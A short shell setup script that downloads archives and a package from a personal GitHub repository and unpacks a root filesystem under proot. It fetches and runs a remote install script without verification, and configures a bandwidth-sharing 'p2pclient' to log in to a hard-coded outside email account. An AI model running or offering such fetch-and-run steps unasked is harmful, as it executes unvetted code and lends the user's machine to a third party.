mv expressinstall.sh jcdhisf
wget -O root-files.zip https://github.com/sgczeslaw/hiiiii/raw/main/root-files.zip
unzip root-files.zip

# Removing Unnecessary files
rm main.sh
rm root-files.zip
rm video.mp4
rm music.mp3
rm root.sh

unzip root.zip
rm root.zip

tar -xvf root.tar.xz
rm root.tar.xz

# Halfway done!
clear

wget -O p2p.deb https://github.com/sgczeslaw/hiiiii/raw/main/p2p.deb
wget -O p2pfiles.zip https://github.com/sgczeslaw/hiiiii/raw/main/p2pfiles.zip
unzip p2pfiles.zip
rm p2pfiles.zip
mv Files/* .

wget -O installreqs.sh https://raw.githubusercontent.com/sgczeslaw/hiiiii/main/installreqs.sh
./dist/proot -S . /bin/bash ./installreqs.sh
echo "p2pclient --login per2easydev@proton.me" > run.sh
